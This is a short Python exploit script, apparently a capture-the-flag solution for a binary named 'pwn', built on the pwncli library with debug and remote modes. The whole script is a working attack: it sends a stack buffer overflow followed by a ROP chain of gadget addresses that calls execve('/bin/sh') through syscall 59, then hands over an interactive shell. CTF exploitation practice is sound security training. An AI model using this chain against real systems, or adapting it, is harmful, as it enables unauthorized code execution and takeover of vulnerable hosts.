#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

syscall_ret = 0x0000000000416c44
pop_rdi_ret = 0x0000000000401862
pop_rsi_ret = 0x000000000040f15e
pop_rdx_ret = 0x000000000040176f
pop_rax_ret = 0x0000000000414df4
str_bin_sh  = next(elf.search(b"/bin/sh\x00"))

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(pop_rdi_ret) + p64(str_bin_sh)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall_ret)
s(payload)

ia()
